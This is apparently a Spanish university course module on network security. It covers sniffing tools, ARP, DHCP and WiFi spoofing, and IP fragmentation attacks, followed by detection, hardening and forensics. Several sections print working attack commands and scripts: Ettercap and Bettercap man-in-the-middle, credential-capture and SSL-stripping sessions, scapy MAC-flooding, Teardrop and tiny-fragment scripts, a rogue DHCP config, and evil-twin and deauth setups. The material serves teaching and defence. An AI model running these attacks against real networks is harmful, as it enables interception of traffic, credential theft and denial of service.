# Tema 6: Red

## Índice de Contenidos
1. [Escuchas de Red (Network Sniffing)](#escuchas-de-red-network-sniffing)
2. [Herramientas de Sniffing](#herramientas-de-sniffing)
3. [Técnicas de Sniffing](#técnicas-de-sniffing)
4. [Fragmentación IP](#fragmentación-ip)
5. [Ataques de Fragmentación](#ataques-de-fragmentación)
6. [Detección y Prevención](#detección-y-prevención)
7. [Análisis Forense de Red](#análisis-forense-de-red)

---

## Escuchas de Red (Network Sniffing)

### Concepto de Network Sniffing

#### Definición y Fundamentos
El **network sniffing** es el proceso de captura, monitoreo y análisis del tráfico de red que pasa a través de un segmento de red específico. Esta técnica puede ser utilizada tanto para propósitos legítimos (administración de red, troubleshooting) como maliciosos (espionaje, robo de credenciales).

```
Network Sniffing Process:
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   Source Host   │───→│  Network Media  │───→│ Destination     │
│                 │    │   (Ethernet,    │    │    Host         │
└─────────────────┘    │    WiFi, etc.)  │    └─────────────────┘
                       │                 │
                       ▼                 
                ┌─────────────────┐
                │ Sniffer Device  │
                │   (Promiscuous  │
                │      Mode)      │
                └─────────────────┘
```

#### Tipos de Sniffing

**Sniffing Pasivo:**
- No genera tráfico adicional en la red
- Simplemente captura paquetes que pasan por la interfaz
- Difícil de detectar
- Limitado por topología de red (switches vs hubs)

**Sniffing Activo:**
- Genera tráfico adicional para facilitar la captura
- Incluye técnicas como ARP spoofing, MAC flooding
- Más detectable pero más efectivo
- Permite sniffing en redes conmutadas modernas

### Vulnerabilidades de Protocolos

#### Protocolos Vulnerables al Sniffing
```
Protocolos No Seguros (Plain Text):
├── HTTP (puerto 80)
│   ├── Credenciales de login
│   ├── Cookies de sesión
│   ├── Formularios web
│   └── Contenido completo
├── FTP (puerto 21)
│   ├── Usuario y contraseña
│   ├── Comandos FTP
│   └── Datos transferidos
├── Telnet (puerto 23)
│   ├── Sesiones completas
│   ├── Credenciales de acceso
│   └── Comandos ejecutados
├── SMTP (puerto 25)
│   ├── Contenido de emails
│   ├── Credenciales SMTP
│   └── Headers de correo
├── POP3 (puerto 110)
│   ├── Credenciales de acceso
│   ├── Contenido de emails
│   └── Comandos POP3
├── IMAP (puerto 143)
│   ├── Credenciales de acceso
│   ├── Estructura de mailbox
│   └── Contenido de emails
└── SNMP v1/v2c (puerto 161)
    ├── Community strings
    ├── Configuración de dispositivos
    └── Información de red
```

### Topologías de Red y Sniffing

#### Hubs vs Switches
```
Hub Network (Collision Domain):
┌─────────────────────────────────────────────────────────┐
│                        HUB                              │
│  ┌──────┐  ┌──────┐  ┌──────┐  ┌──────┐  ┌──────┐      │
│  │ PC A │  │ PC B │  │ PC C │  │ PC D │  │Sniffer│      │
│  └──────┘  └──────┘  └──────┘  └──────┘  └──────┘      │
└─────────────────────────────────────────────────────────┘
Todos los paquetes son visibles para todos los dispositivos

Switch Network (Collision Domains Separados):
┌─────────────────────────────────────────────────────────┐
│                      SWITCH                             │
│  ┌──────┐  ┌──────┐  ┌──────┐  ┌──────┐  ┌──────┐      │
│  │ PC A │  │ PC B │  │ PC C │  │ PC D │  │Sniffer│      │
│  └──────┘  └──────┘  └──────┘  └──────┘  └──────┘      │
└─────────────────────────────────────────────────────────┘
Solo paquetes destinados al puerto específico son enviados
```

#### Modo Promiscuo
**Configuración de Interfaz:**
```bash
# Linux - Activar modo promiscuo
ifconfig eth0 promisc
ip link set eth0 promisc on

# Verificar modo promiscuo
ifconfig eth0 | grep PROMISC
cat /sys/class/net/eth0/flags

# Windows - usar herramientas específicas
# WinPcap/Npcap automáticamente maneja modo promiscuo
```

---

## Herramientas de Sniffing

### Wireshark - Análisis Detallado

#### Características Principales
```
Wireshark Capabilities:
├── Protocol Analysis
│   ├── 3000+ protocol dissectors
│   ├── Deep packet inspection
│   ├── Protocol hierarchy statistics
│   └── Expert analysis system
├── Capture Features
│   ├── Live capture desde interfaces
│   ├── Capture filters (BPF syntax)
│   ├── Ring buffer capture
│   └── Remote capture (rpcap)
├── Analysis Features
│   ├── Display filters avanzados
│   ├── Follow TCP/UDP streams
│   ├── Protocol statistics
│   └── I/O graphs y flow graphs
└── Export Options
    ├── Various file formats
    ├── Packet ranges
    ├── Selected packets
    └── Objects from HTTP streams
```

#### Filtros de Captura y Display
**Capture Filters (BPF Syntax):**
```bash
# Capturar solo tráfico HTTP
tcp port 80

# Capturar tráfico hacia/desde host específico
host 192.168.1.100

# Capturar solo paquetes TCP SYN
tcp[tcpflags] & tcp-syn != 0

# Capturar tráfico DNS
udp port 53

# Capturar solo tráfico de una subred específica
net 192.168.1.0/24
```

**Display Filters:**
```bash
# Mostrar solo tráfico HTTP
http

# Filtrar por dirección IP específica
ip.addr == 192.168.1.100

# Mostrar solo respuestas HTTP con código de error
http.response.code >= 400

# Filtrar paquetes TCP con flag SYN activo
tcp.flags.syn == 1

# Mostrar solo tráfico HTTPS (TLS)
ssl or tls

# Filtrar por contenido específico
frame contains "password"
```

#### Análisis Avanzado con Wireshark
**Follow Stream Analysis:**
```
Stream Following Types:
├── Follow TCP Stream
│   ├── Reconstrucción de sesión completa
│   ├── Vista de conversación bidireccional
│   └── Export de contenido
├── Follow UDP Stream
│   ├── Seguimiento de flujos UDP
│   ├── Útil para DNS, DHCP analysis
│   └── Datagram reconstruction
├── Follow SSL Stream
│   ├── Análisis de handshake TLS
│   ├── Certificate verification
│   └── Cipher suite analysis
└── Follow HTTP Stream
    ├── Request/Response pairs
    ├── Header analysis
    └── Content reconstruction
```

### Tcpdump - Línea de Comandos

#### Uso Básico de Tcpdump
```bash
# Captura básica en interfaz específica
tcpdump -i eth0

# Capturar y guardar en archivo
tcpdump -i eth0 -w capture.pcap

# Leer archivo de captura
tcpdump -r capture.pcap

# Captura con timestamp y resolución de nombres deshabilitada
tcpdump -i eth0 -tttt -n

# Capturar solo headers (primeros 68 bytes)
tcpdump -i eth0 -s 68

# Modo verbose con detalles adicionales
tcpdump -i eth0 -vvv
```

#### Filtros Avanzados en Tcpdump
```bash
# Filtrar por protocolo y puerto
tcpdump -i eth0 tcp port 80

# Filtrar por host y dirección
tcpdump -i eth0 host 192.168.1.100 and port 22

# Capturar solo paquetes SYN
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'

# Filtrar tráfico ICMP (ping)
tcpdump -i eth0 icmp

# Capturar tráfico DNS
tcpdump -i eth0 udp port 53

# Filtrar por tamaño de paquete
tcpdump -i eth0 greater 1000

# Capturar tráfico entre dos hosts específicos
tcpdump -i eth0 host 192.168.1.10 and host 192.168.1.20
```

### Ettercap - Sniffing Activo

#### Capacidades de Ettercap
```
Ettercap Features:
├── ARP Spoofing
│   ├── Man-in-the-middle attacks
│   ├── Bidirectional spoofing
│   └── Selective targeting
├── DNS Spoofing
│   ├── Custom DNS responses
│   ├── Domain redirection
│   └── Integrated with ARP spoofing
├── Password Collection
│   ├── Protocol dissectors
│   ├── Automatic credential extraction
│   └── Real-time display
├── SSL Stripping
│   ├── HTTPS to HTTP downgrade
│   ├── Certificate replacement
│   └── Transparent proxy mode
└── Plugin System
    ├── Extensible architecture
    ├── Custom attack plugins
    └── Automated attack sequences
```

#### Uso Práctico de Ettercap
```bash
# Escaneo de hosts activos
ettercap -T -P list_arp

# ARP spoofing básico (man-in-the-middle)
ettercap -T -M arp:remote /192.168.1.10// /192.168.1.1//

# ARP spoofing con captura de passwords
ettercap -T -M arp:remote -L passwords /192.168.1.10// /192.168.1.1//

# DNS spoofing combinado con ARP spoofing
ettercap -T -M arp:remote -P dns_spoof /192.168.1.10// /192.168.1.1//

# Modo text interface con logging
ettercap -T -M arp:remote -w capture.pcap /192.168.1.10// /192.168.1.1//

# SSL stripping attack
ettercap -T -M arp:remote -P sslstrip /192.168.1.10// /192.168.1.1//
```

### Bettercap - Herramienta Moderna

#### Arquitectura Modular de Bettercap
```javascript
// Bettercap session example
# Network discovery
net.probe on

# Enable ARP spoofing
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.10
arp.spoof on

# HTTP proxy con script injection
set http.proxy.script /path/to/script.js
http.proxy on

# HTTPS proxy con certificate cloning
https.proxy on

# Credential harvesting
set net.sniff.verbose true
set net.sniff.local true
net.sniff on

# WiFi handshake capture
wifi.recon on
wifi.deauth 00:11:22:33:44:55
```

---

## Técnicas de Sniffing

### Sniffing en Redes Conmutadas

#### ARP Spoofing para Sniffing
```
ARP Spoofing Attack Flow:
1. Atacante descubre hosts activos en la red
2. Envía ARP replies falsificadas
   - A víctima: "Gateway MAC = Atacante MAC"
   - A gateway: "Víctima MAC = Atacante MAC"
3. Tráfico de víctima pasa por atacante
4. Atacante captura y reenvía paquetes
5. Sniffing transparente del tráfico

Implementación:
┌─────────────┐    ARP: 192.168.1.1 is at    ┌─────────────┐
│   Víctima   │ ←─────── AA:BB:CC:DD:EE:FF ─── │  Atacante   │
│192.168.1.10 │                               │192.168.1.100│
└─────────────┘    ARP: 192.168.1.10 is at   └─────────────┘
       │           ─────── AA:BB:CC:DD:EE:FF ──────┐
       │                                           │
       ▼                                           ▼
┌─────────────┐                               ┌─────────────┐
│   Gateway   │ ←──── All traffic routed ────→│  Atacante   │
│ 192.168.1.1 │        through attacker       │(Man-in-Middle)
└─────────────┘                               └─────────────┘
```

#### MAC Flooding Attack
```
MAC Table Flooding Process:
1. Atacante genera miles de paquetes con MACs aleatorias
2. Switch aprende todas las MACs falsas
3. MAC address table se llena completamente
4. Switch entra en "failopen mode"
5. Actúa como hub, enviando tráfico a todos los puertos

Implementación con macof:
#!/bin/bash
# MAC flooding script
macof -i eth0 -n 1000000

# Custom MAC flooding with scapy
python3 -c "
from scapy.all import *
import random

def mac_flood():
    for i in range(10000):
        mac_src = ':'.join(['%02x' % random.randint(0,255) for _ in range(6)])
        mac_dst = ':'.join(['%02x' % random.randint(0,255) for _ in range(6)])
        packet = Ether(src=mac_src, dst=mac_dst) / IP(dst='192.168.1.1')
        sendp(packet, iface='eth0', verbose=False)

mac_flood()
"
```

### DHCP Spoofing

#### Rogue DHCP Server Attack
```
DHCP Spoofing Process:
1. Atacante configura servidor DHCP malicioso
2. Responde a DHCP Discovery requests
3. Proporciona configuración maliciosa:
   - Gateway IP = Atacante IP
   - DNS Server = Atacante IP
   - Subnet válida para evitar sospecha
4. Clientes usan atacante como gateway
5. Todo el tráfico pasa por el atacante

DHCP Server Configuration (dnsmasq):
# /etc/dnsmasq.conf
interface=eth0
dhcp-range=192.168.1.50,192.168.1.100,12h
dhcp-option=3,192.168.1.200  # Gateway (attacker)
dhcp-option=6,192.168.1.200  # DNS server (attacker)
dhcp-authoritative
```

### WiFi Sniffing Techniques

#### Monitor Mode y Packet Capture
```bash
# Configurar interfaz en monitor mode
airmon-ng check kill
airmon-ng start wlan0

# Capturar tráfico WiFi
airodump-ng wlan0mon

# Capturar handshake específico
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon

# Deauthentication attack para forzar handshake
aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon
```

#### Evil Twin Attack
```
Evil Twin Setup:
1. Create rogue access point with same SSID
2. Deauthenticate clients from legitimate AP
3. Clients connect to rogue AP
4. Capture all unencrypted traffic
5. Optional: Credential harvesting portal

# hostapd configuration
interface=wlan0
driver=nl80211
ssid=CompanyWiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
```

---

## Fragmentación IP

### Fundamentos de Fragmentación IP

#### Por qué Ocurre la Fragmentación
```
MTU (Maximum Transmission Unit):
┌─────────────────────────────────────────────────────────┐
│ Ethernet Frame (1518 bytes max)                        │
│ ┌─────────────────────────────────────────────────────┐ │
│ │ IP Packet (1500 bytes max payload)                 │ │
│ │ ┌─────────────────────────────────────────────────┐ │ │
│ │ │ Data Payload (varies)                          │ │ │
│ │ └─────────────────────────────────────────────────┘ │ │
│ └─────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────┘

Common MTU Values:
├── Ethernet: 1500 bytes
├── PPPoE: 1492 bytes  
├── WiFi: 1500 bytes (typically)
├── Token Ring: 4464 bytes
└── FDDI: 4352 bytes
```

#### Proceso de Fragmentación
```
IP Fragmentation Process:
Original Packet (2000 bytes data + 20 bytes IP header)
                    │
                    ▼ (MTU = 1500)
          ┌─────────────────────┐
          │   Router/Gateway    │
          │  (Fragmentation)    │
          └─────────────────────┘
                    │
    ┌───────────────┼───────────────┐
    ▼               ▼               ▼
Fragment 1      Fragment 2      Fragment 3
(1480 bytes)    (1480 bytes)    (60 bytes)
ID=12345        ID=12345        ID=12345
Offset=0        Offset=1480     Offset=2960
MF=1            MF=1            MF=0
```

#### Campos del Header IP para Fragmentación
```
IP Header Fragmentation Fields:
├── Identification (16 bits)
│   ├── Unique ID para todos los fragmentos
│   └── Mismo valor en todos los fragmentos
├── Flags (3 bits)
│   ├── Bit 0: Reserved (must be 0)
│   ├── Bit 1: Don't Fragment (DF)
│   └── Bit 2: More Fragments (MF)
└── Fragment Offset (13 bits)
    ├── Position del fragmento en unidades de 8 bytes
    ├── Primer fragmento = 0
    └── Subsecuentes = offset acumulativo
```

### Problemas de Seguridad con Fragmentación

#### Evasión de Firewalls
```
Firewall Evasion via Fragmentation:
┌─────────────────────────────────────────────────────────┐
│ Normal Packet:                                          │
│ [IP Header][TCP Header][Data: "GET /admin/"]           │
│                                                         │
│ Firewall Rule: DENY packets containing "/admin/"       │
│ Result: BLOCKED                                         │
└─────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────┐
│ Fragmented Packet:                                      │
│ Fragment 1: [IP Header][TCP Header][Data: "GET /ad"]   │
│ Fragment 2: [IP Header][Data: "min/"]                  │
│                                                         │
│ Firewall Analysis: Each fragment analyzed separately   │
│ Result: ALLOWED (content split across fragments)       │
└─────────────────────────────────────────────────────────┘
```

---

## Ataques de Fragmentación

### Teardrop Attack

#### Mecanismo del Teardrop Attack
```
Teardrop Attack Mechanism:
Fragment 1:                Fragment 2:
┌─────────────────────┐    ┌─────────────────────┐
│ Offset: 0           │    │ Offset: 24          │
│ Length: 36          │    │ Length: 400         │
│ Data: bytes 0-35    │    │ Data: bytes 24-423  │
└─────────────────────┘    └─────────────────────┘
          │                          │
          └──────────┬───────────────┘
                     ▼
              Overlap Problem:
         bytes 24-35 are duplicated
         
OS Reassembly Buffer Overflow:
┌──────────────────────────────────────────────────────────┐
│ Expected: [0-23][24-35][36-423]                         │
│ Reality:  [0-23][24-35 overlap][24-423]                 │
│ Result:   Buffer confusion, memory corruption, crash     │
└──────────────────────────────────────────────────────────┘
```

#### Implementación del Teardrop Attack
```python
#!/usr/bin/env python3
from scapy.all import *

def teardrop_attack(target_ip):
    # First fragment - normal
    fragment1 = IP(dst=target_ip, id=12345, flags="MF", frag=0) / \
                UDP(dport=137, sport=7) / ("A" * 8)
    
    # Second fragment - overlapping with negative offset
    fragment2 = IP(dst=target_ip, id=12345, flags=0, frag=6) / \
                ("B" * 4)
    
    # Send fragments
    send(fragment1)
    send(fragment2)
    print(f"Teardrop attack sent to {target_ip}")

# Usage
teardrop_attack("192.168.1.100")
```

### Ping of Death

#### Concepto y Funcionamiento
```
Ping of Death Attack:
Normal ICMP Ping:
├── IP Header: 20 bytes
├── ICMP Header: 8 bytes  
├── Data: 32 bytes (default)
└── Total: 60 bytes

Ping of Death:
├── IP Header: 20 bytes
├── ICMP Header: 8 bytes
├── Data: 65,507 bytes (maximum for IP)
└── Total: 65,535 bytes (maximum IP packet size)

Problem:
65,535 bytes > MTU, causa fragmentación masiva
Algunos OS no pueden manejar reassembly de paquete tan grande
Result: Buffer overflow, system crash
```

#### Implementación Moderna
```bash
# Ping of Death tradicional (muchos OS modernos son inmunes)
ping -s 65507 target_ip

# Variante con fragmentación específica
hping3 -1 -d 65507 target_ip

# Custom implementation con control de fragmentación
python3 -c "
from scapy.all import *
# Create oversized packet that will fragment
packet = IP(dst='192.168.1.100')/ICMP()/'A'*65000
send(fragment(packet, fragsize=8))
"
```

### Tiny Fragment Attacks

#### Fragmentos Miniatura para Evasión
```
Tiny Fragment Attack:
Normal TCP Packet:
[IP Header 20][TCP Header 20][Data]

Tiny Fragment Attack:
Fragment 1: [IP Header 20][TCP partial 8]
Fragment 2: [IP Header 20][TCP remainder 12][Data]

Problem:
- First fragment doesn't contain complete port info
- Firewall can't make proper filtering decision
- Some systems allow tiny fragments through
- Reassembly creates complete malicious packet
```

#### Herramientas para Ataques de Fragmentación
```bash
# Fragrouter - fragment packets in various ways
fragrouter -B1 192.168.1.100

# Nmap fragmentation options
nmap -f target_ip                    # Fragment packets
nmap --mtu 8 target_ip              # Custom MTU size
nmap -sS -f --data-length 200 target_ip

# Custom fragmentation con Scapy
python3 -c "
from scapy.all import *

def tiny_frag_attack(target, port):
    # Create normal SYN packet
    packet = IP(dst=target)/TCP(dport=port, flags='S')
    
    # Fragment with tiny fragments (8 bytes)
    fragments = fragment(packet, fragsize=8)
    
    # Send fragments with delay
    for frag in fragments:
        send(frag)
        time.sleep(0.1)

tiny_frag_attack('192.168.1.100', 80)
"
```

---

## Detección y Prevención

### Detección de Network Sniffing

#### Indicadores de Sniffing Activo
```
Sniffing Detection Methods:
├── ARP Table Monitoring
│   ├── Multiple MAC addresses para single IP
│   ├── Frequent ARP table changes
│   ├── ARP responses for non-existent IPs
│   └── Gratuitous ARP anomalies
├── Network Latency Analysis
│   ├── Increased round-trip times
│   ├── Jitter in network performance
│   ├── Timing analysis of responses
│   └── Path MTU discovery irregularities
├── Switch Port Analysis
│   ├── Unusual traffic patterns
│   ├── High broadcast traffic
│   ├── Port mirroring detection
│   └── SPAN port identification
└── Active Probing
    ├── Decoy packets with fake information
    ├── Honeypot techniques
    ├── DNS canary tokens
    └── HTTP canary tokens
```

#### Herramientas de Detección
```bash
# Detect promiscuous mode interfaces
# Linux
cat /proc/net/packet
netstat -i | grep PROMISC

# Detect ARP spoofing
arpwatch -i eth0 -f /var/log/arp.log

# Monitor for suspicious ARP traffic
tcpdump -i eth0 arp and arp[6:2] = 2  # ARP replies only

# XArp for Windows ARP monitoring
# Commercial tool for ARP attack detection

# Network baseline monitoring
ntopng -i eth0 -P /var/lib/ntopng/ntopng.pid
```

### Contramedidas Técnicas

#### Configuración de Switches
```
Switch Security Configuration:
├── Port Security
│   ├── switchport port-security
│   ├── switchport port-security maximum 1
│   ├── switchport port-security violation shutdown
│   └── switchport port-security mac-address sticky
├── Dynamic ARP Inspection (DAI)
│   ├── ip arp inspection vlan 10-20
│   ├── ip arp inspection validate src-mac dst-mac ip
│   └── Interface trust configuration
├── DHCP Snooping
│   ├── ip dhcp snooping
│   ├── ip dhcp snooping vlan 10-20
│   ├── ip dhcp snooping information option
│   └── Trust port configuration
└── Private VLANs
    ├── vlan 100 private-vlan primary
    ├── vlan 101 private-vlan isolated
    └── Interface private-vlan mapping
```

#### Network Segmentation
```
Network Segmentation Strategy:
┌─────────────────────────────────────────────────────────┐
│                   Core Network                          │
├─────────────────────────────────────────────────────────┤
│ VLAN 10: Management Network                             │
│ ├── Network devices                                     │
│ ├── Monitoring systems                                  │
│ └── Administrative access                               │
├─────────────────────────────────────────────────────────┤
│ VLAN 20: User Network                                   │
│ ├── Employee workstations                               │
│ ├── Printers and shared resources                       │
│ └── Internet access                                     │
├─────────────────────────────────────────────────────────┤
│ VLAN 30: Server Network                                 │
│ ├── Application servers                                 │
│ ├── Database servers                                    │
│ └── File servers                                        │
├─────────────────────────────────────────────────────────┤
│ VLAN 40: DMZ                                            │
│ ├── Web servers                                         │
│ ├── Email servers                                       │
│ └── Public-facing services                              │
└─────────────────────────────────────────────────────────┘
```

### Prevención de Ataques de Fragmentación

#### Firewall Configuration
```
Fragmentation Attack Prevention:
├── Fragment Reassembly
│   ├── Reassemble fragments before inspection
│   ├── Apply rules to complete packets
│   ├── Timeout for incomplete fragments
│   └── Memory management for reassembly
├── Fragment Filtering
│   ├── Block tiny fragments (< minimum size)
│   ├── Block overlapping fragments
│   ├── Limit fragments per packet
│   └── Rate limiting fragmented packets
├── Anti-Evasion
│   ├── Normalize fragment streams
│   ├── Detect fragment anomalies
│   ├── Block suspicious fragmentation patterns
│   └── Log fragmentation attempts
└── OS Hardening
    ├── Disable IP forwarding if not needed
    ├── Configure fragment timeout values
    ├── Enable fragment drop policies
    └── Monitor system resources
```

#### Implementación de Controles
```bash
# Linux iptables rules for fragment control
# Block tiny fragments
iptables -A INPUT -f -m length --length 0:68 -j DROP

# Limit fragment rate
iptables -A INPUT -f -m limit --limit 10/second -j ACCEPT
iptables -A INPUT -f -j DROP

# Block overlapping fragments (requires patch)
# echo 1 > /proc/sys/net/ipv4/ip_always_defrag

# Cisco ASA fragmentation settings
fragment size 200 outside
fragment timeout 5 outside
fragment chain 24 outside

# Juniper SRX fragmentation controls
set security alarms potential-violation-counts fragmented-packet threshold 100
set security log fragmented-packet
```

---

## Análisis Forense de Red

### Metodología Forense

#### Proceso de Investigación Forense
```
Network Forensics Process:
├── 1. Identification
│   ├── Incident detection and classification
│   ├── Evidence source identification
│   ├── Legal considerations and chain of custody
│   └── Resource allocation and team assembly
├── 2. Preservation
│   ├── Live network capture
│   ├── Log file collection
│   ├── Configuration backups
│   └── Volatile data preservation
├── 3. Collection
│   ├── Packet capture from multiple points
│   ├── Flow data collection
│   ├── DNS logs and DHCP leases
│   └── Firewall and IDS logs
├── 4. Analysis
│   ├── Timeline reconstruction
│   ├── Traffic pattern analysis
│   ├── Protocol analysis and reconstruction
│   └── Correlation of multiple data sources
├── 5. Presentation
│   ├── Evidence documentation
│   ├── Technical report preparation
│   ├── Executive summary creation
│   └── Legal testimony preparation
└── 6. Review
    ├── Peer review of findings
    ├── Quality assurance checks
    ├── Lessons learned documentation
    └── Process improvement recommendations
```

### Herramientas Forenses

#### NetworkMiner - Network Forensic Analysis
```
NetworkMiner Capabilities:
├── Protocol Analysis
│   ├── HTTP, SMTP, POP3, IMAP analysis
│   ├── FTP file transfer reconstruction
│   ├── Credential extraction
│   └── Certificate analysis
├── File Extraction
│   ├── Files transmitted over HTTP
│   ├── Email attachments
│   ├── Images and documents
│   └── Executable files
├── Host Information
│   ├── Operating system fingerprinting
│   ├── MAC address analysis
│   ├── DNS lookups performed
│   └── Open ports and services
└── Timeline Creation
    ├── Chronological event ordering
    ├── Session timeline visualization
    ├── Communication patterns
    └── Data flow analysis
```

#### Xplico - Network Forensic Analysis Tool
```bash
# Xplico installation and usage
apt-get install xplico

# Start Xplico services
service apache2 start
service xplico start

# Access web interface
# http://localhost:9876
# Default credentials: admin/xplico

# Command line analysis
xplico -m rltm -i eth0
```

### Análisis de Tráfico Malicioso

#### Identificación de Patrones de Ataque
```
Malicious Traffic Patterns:
├── Port Scanning Detection
│   ├── Sequential port probes
│   ├── SYN scan patterns
│   ├── UDP scan characteristics
│   └── Timing analysis
├── DDoS Attack Patterns
│   ├── High packet rate from multiple sources
│   ├── Amplification attack signatures
│   ├── Protocol-specific patterns
│   └── Geographic source distribution
├── Data Exfiltration
│   ├── Large outbound data transfers
│   ├── Unusual protocols or ports
│   ├── Encrypted channel establishment
│   └── DNS tunneling patterns
├── Malware Communications
│   ├── Command and control beaconing
│   ├── Regular callback patterns
│   ├── Suspicious DNS queries
│   └── HTTP/HTTPS anomalies
└── Lateral Movement
    ├── Internal network scanning
    ├── Service enumeration attempts
    ├── Credential stuffing patterns
    └── SMB/RDP brute force attempts
```

#### Wireshark Advanced Analysis
```bash
# Wireshark command line analysis (tshark)
# Extract HTTP objects
tshark -r capture.pcap --export-objects http,/tmp/http_objects

# DNS analysis
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name

# SSL/TLS certificate analysis
tshark -r capture.pcap -Y "ssl.handshake.type == 11" -T fields -e ssl.handshake.certificate

# Detect potential data exfiltration
tshark -r capture.pcap -Y "tcp.len > 1400" -T fields -e ip.src -e ip.dst -e tcp.len

# Extract unique user agents
tshark -r capture.pcap -Y "http.request" -T fields -e http.user_agent | sort -u

# Analyze connection patterns
tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.dstport | sort | uniq -c
```

### Documentación y Reportes

#### Estructura del Reporte Forense
```
Network Forensics Report Structure:
├── Executive Summary
│   ├── Incident overview
│   ├── Key findings
│   ├── Impact assessment
│   └── Recommendations
├── Technical Analysis
│   ├── Methodology used
│   ├── Tools and techniques
│   ├── Evidence sources
│   └── Analysis timeline
├── Findings Detail
│   ├── Attack vectors identified
│   ├── Compromised systems
│   ├── Data accessed/stolen
│   └── Attacker attribution (if possible)
├── Evidence Appendix
│   ├── Packet captures
│   ├── Log excerpts
│   ├── Screenshots
│   └── Configuration files
├── Chain of Custody
│   ├── Evidence handling log
│   ├── Personnel involved
│   ├── Storage and transfer records
│   └── Integrity verification
└── Legal Considerations
    ├── Compliance requirements
    ├── Privacy implications
    ├── Law enforcement coordination
    └── Disclosure requirements
```

#### Herramientas de Documentación
```bash
# Create forensic timeline with log2timeline
log2timeline.py --storage-file timeline.plaso evidence.pcap

# Generate timeline from plaso storage
psort.py -w timeline.csv timeline.plaso

# Generate visual network maps with afterglow
perl afterglow.pl -c color.properties < netstat.log | neato -Tgif -o network_map.gif

# Create network diagrams with yed or draw.io
# Documentation templates available for incident response
```

## Objetivos de Aprendizaje
- [ ] Comprender las técnicas de sniffing de red
- [ ] Utilizar herramientas de captura de paquetes
- [ ] Identificar ataques de fragmentación IP
- [ ] Implementar contramedidas efectivas
- [ ] Realizar análisis forense básico

## Recursos Adicionales
- Guías de Wireshark
- Laboratorios de práctica
- Documentación de protocolos de red

## Actividades
- Práctica con Wireshark
- Simulación de ataques de sniffing
- Configuración de contramedidas
- Análisis forense de capturas
